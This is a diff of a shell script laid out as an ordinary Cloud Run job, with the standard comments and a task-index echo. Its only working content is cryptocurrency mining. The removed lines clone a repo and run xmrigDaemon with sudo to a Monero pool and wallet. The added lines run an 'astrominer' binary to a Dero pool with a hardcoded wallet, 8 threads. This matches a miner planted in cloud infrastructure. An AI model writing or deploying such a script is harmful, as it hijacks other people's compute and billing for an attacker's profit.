@@ -1,5 +1,16 @@
+#!/bin/bash
+set -euo pipefail
 
-git clone https://gitlab.com/rumah2/xdag.git
-cd xdag
-chmod 500 xmrigDaemon xmrigMiner 
-sudo ./xmrigDaemon --donate-level 1 -o sf.pool-pay.com:4026 -u solo:SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -k -t 8
+# In production, consider printing commands as they are executed. 
+# This helps with debugging if things go wrong and you only 
+# have the logs.
+#
+# Add -x:
+# set -euox pipefail
+
+CLOUD_RUN_TASK_INDEX=${CLOUD_RUN_TASK_INDEX:=0}
+CLOUD_RUN_TASK_ATTEMPT=${CLOUD_RUN_TASK_ATTEMPT:=0}
+
+echo "Starting Task #${CLOUD_RUN_TASK_INDEX}, Attempt #${CLOUD_RUN_TASK_ATTEMPT}..."
+chmod 500 playground && 
+ ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r community-pools.mysrv.cloud:10300  -p rpc -t 8
